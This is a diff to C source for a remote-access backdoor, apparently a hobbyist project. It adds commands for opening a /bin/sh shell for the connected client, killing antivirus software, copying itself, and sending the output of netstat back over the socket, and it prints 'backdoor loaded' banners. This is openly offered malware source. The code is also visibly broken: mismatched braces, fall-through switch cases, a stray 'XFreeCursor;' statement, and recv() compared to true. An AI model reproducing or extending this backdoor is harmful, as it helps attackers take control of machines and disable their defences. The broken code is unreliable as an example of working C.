@@ -17,7 +17,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 */
 
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -27,6 +26,8 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <errno.h>
 #include <string.h>
 #include <arpa/inet.h>
+#include <netinet/in.h>
+#include <fcntl.h>
 #include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -183,7 +184,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
     return;
 
   }
-  
+
   void
   shell()
 
@@ -195,7 +196,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
     char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
     char *cmd[] = { "/bin/sh", (char *)0 };
 
-  //  XFreeCursor; //magic happens here
+    XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -256,7 +257,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      /* fck, now  i have power!
       made conditions here. */
      if(recv(x,command,bytes,NULL) == true)
-//     backdoor_connect();
      send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
 
      //handle with the impossible errors.
@@ -292,8 +292,8 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      {
       char command[bytes], bufaux[bytes], *loc;
-      int tbuf, escolha;
-      char comandos [] = "/shell";
+      int tbuf, escolha, pontarq;
+      char comandos [] = "/shell /killav /exit";
       struct sockaddr_in s;
 //      background_life();
      {
@@ -323,17 +323,16 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      }
 
-     strcpy(command,"Backdoor connected");
+     strcpy(command,"\n ** Backdoor connected ** \n");
      strcpy(bufaux,command);
      send(x,command,strlen(command), 0);
 
     // Recebe ack do cli
      tbuf = recv(x, command,bytes, 0);
      command[tbuf]=0x00;
-    //printf(">: %s\n",buffer);
-     do
+    // printf(">: %s\n",command);
 
-     {
+
 
      tbuf = recv(x,command,bytes,0);
      command[tbuf]=0x00;
@@ -351,23 +350,51 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
    {
 
-     case 2:
+     case 0:
+      return;
 
-    {
+     case 1:
+     kill_antivirus();
+
+     case 2:
 
      shell();
 
+     case 3:
+
+     auto_copy();
+
+     case 4:
+          //puts(">> Portas abertas no backdoor");
+          system("netstat -ant > temp");
+          pontarq = open("temp", O_RDONLY, 0666);
+          if(pontarq < 0)
+         {
+              puts("Erro no arquivo temporario!");
+         }
+          tbuf = read(pontarq,command,sizeof(command));
+          close(pontarq);
+          send(x,command,tbuf,0);
+          system("rm -r temp");
+          return;
+
+
               }
 
+            }
 
-           }
+
+               while(true);
+
+
+           {
+
 
 
         }
 
-      while(1);
-    }
 
 
 
 }
+
